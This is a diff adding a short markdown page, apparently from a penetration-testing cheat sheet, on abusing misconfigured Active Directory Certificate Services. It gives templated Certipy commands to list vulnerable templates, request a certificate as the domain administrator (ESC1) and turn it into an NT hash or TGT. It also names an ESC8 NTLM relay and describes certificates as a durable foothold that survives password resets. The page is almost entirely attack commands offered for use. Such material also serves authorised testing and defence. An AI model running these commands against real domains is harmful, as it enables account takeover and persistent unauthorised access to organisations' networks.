@@ -1,0 +1,23 @@
+---
+title: "AD Certificate Services (ADCS)"
+---
+
+Misconfigured certificate templates (ESC1–ESC8) let low-priv users obtain certs that authenticate as anyone. Enumerate with Certipy.
+
+```bash
+# find vulnerable templates
+certipy find -u USER@$DOMAIN -p PASS -dc-ip $DC -vulnerable -stdout
+```
+
+## ESC1 — template allows SAN + client auth
+
+```bash
+# request a cert AS the domain admin
+certipy req -u USER@$DOMAIN -p PASS -ca CA-NAME -template VulnTemplate -upn administrator@$DOMAIN -dc-ip $DC
+# authenticate with the cert -> get NT hash / TGT
+certipy auth -pfx administrator.pfx -dc-ip $DC
+```
+
+<Tip>
+ESC8 = NTLM relay to the CA's web enrollment (`certipy relay`). Certificates survive password resets, making them a durable foothold.
+</Tip>
